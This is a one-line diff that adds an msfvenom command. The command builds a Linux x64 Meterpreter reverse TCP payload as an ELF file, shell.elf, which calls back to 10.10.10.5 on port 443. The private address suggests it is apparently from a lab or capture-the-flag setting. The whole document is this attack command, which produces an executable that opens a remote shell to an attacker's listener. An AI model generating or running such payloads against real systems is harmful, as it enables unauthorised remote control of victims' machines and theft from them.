@@ -1,0 +1,1 @@
+msfvenom -p Linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
